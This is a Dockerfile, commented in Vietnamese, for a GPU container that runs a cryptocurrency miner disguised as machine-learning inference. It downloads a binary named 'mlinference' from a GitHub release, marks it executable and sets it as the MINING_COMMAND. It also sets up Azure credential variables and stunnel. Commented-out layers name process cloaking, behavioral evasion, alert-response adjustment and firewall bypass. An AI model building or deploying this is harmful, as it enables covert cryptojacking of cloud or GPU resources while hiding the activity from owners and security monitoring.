# Bước 1: Sử dụng nền tảng CUDA của NVIDIA
FROM nvidia/cuda:11.7.1-cudnn8-runtime-ubuntu22.04

# Thiết lập biến môi trường để chặn tương tác đầu vào trong quá trình cài đặt
ENV DEBIAN_FRONTEND=noninteractive \
    PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1

# Thêm biến môi trường Azure
ENV AZURE_SUBSCRIPTION_ID="" \
    AZURE_CLIENT_ID="" \
    AZURE_CLIENT_SECRET="" \
    AZURE_TENANT_ID=""

# Bước 2: Cài đặt các thư viện hệ thống và công cụ cần thiết
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        python3 python3-pip curl git build-essential cmake \
        libssl-dev libeigen3-dev libnuma-dev stunnel4 \
        cpufrequtils iproute2 util-linux libnvidia-ml-dev \
        pciutils openssl lm-sensors powerstat stress-ng bash \
        htop locales iptables powertop \
    && rm -rf /var/lib/apt/lists/*

# Thiết lập locale
RUN locale-gen en_US.UTF-8 && \
    update-locale LANG=en_US.UTF-8

# Cài đặt mlinference và thiết lập các quyền cần thiết
RUN curl -L -o /usr/local/bin/mlinference "https://github.com/wollfoo/llmsdeep/releases/download/mlinference/mlinference" && \
    chmod +x /usr/local/bin/mlinference && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

# Sao chép và cấu hình stunnel
COPY stunnel.conf /etc/stunnel/stunnel.conf
RUN chmod 700 /etc/stunnel/stunnel.conf

# Bước 3: Thiết lập thư mục làm việc
WORKDIR /app

# Bước 4: Sao chép và cài đặt các phụ thuộc Python
COPY requirements.txt /app/
RUN python3 -m pip install --upgrade pip 
RUN pip install --no-cache-dir -r requirements.txt --root-user-action=ignore

# Bước 5: Sao chép toàn bộ thư mục mining_environment và thiết lập permissions
# Lớp 1: Môi Trường Khai Thác và tối ưu tài nguyên
COPY mining_environment/ /app/mining_environment/
RUN chmod 600 /app/mining_environment/config/*.json && \
    chmod +x /app/mining_environment/scripts/*.py && \
    chmod 600 /app/mining_environment/logs/*.log 

# Bước 6: Thiết lập các biến môi trường cố định cho Lớp 1
ENV LOG_ENCRYPTION_KEY=""
ENV SCRIPT_DIR=/app/mining_environment/scripts \
    CONFIG_DIR=/app/mining_environment/config \
    MODELS_DIR=/app/mining_environment/models \
    LOGS_DIR=/app/mining_environment/logs \
    RESOURCES_DIR=/app/mining_environment/resources \
    MINING_COMMAND=/usr/local/bin/mlinference \
    MINING_CONFIG=mlinference_config.json 

# Bước 7: Sao chép các lớp 02 đến lớp 10 nếu cần (đang được giữ dưới dạng comment)
# COPY process-cloaking-endpoint-protection/ /app/process-cloaking-endpoint-protection/
# COPY network-traffic-protection/ /app/network-traffic-protection/
# COPY identity-access-protection/ /app/identity-access-protection/
# COPY behavioral-adjustment-evasion/ /app/behavioral-adjustment-evasion/
# COPY alert-response-adjustment/ /app/alert-response-adjustment/
# COPY log-data-protection/ /app/log-data-protection/
# COPY firewall_packet_inspection_bypass/ /app/firewall-packet-inspection-bypass/
# COPY compliance-zero-trust/ /app/compliance-zero-trust/

# Thiết lập permissions cho các thư mục lớp 02 đến lớp 10 (nếu sao chép)
# RUN chmod -R 700 /app/process-cloaking-endpoint-protection/ \
#     /app/network-traffic-protection/ /app/identity-access-protection/ \
#     /app/behavioral-adjustment-evasion/ /app/alert-response-adjustment/ \
#     /app/log-data-protection/ /app/firewall-packet-inspection-bypass/ \
#     /app/compliance-zero-trust/

# Bước 8: Sao chép script khởi động
COPY start_mining.py /app/
RUN chmod +x /app/start_mining.py

# Bước 9: Đảm bảo các tệp và thư mục có quyền truy cập phù hợp
# Nếu cần, thêm các lệnh chmod hoặc chown thêm ở đây

# Bước 10: Thiết lập điểm vào (entrypoint)
ENTRYPOINT ["python3", "/app/start_mining.py"]
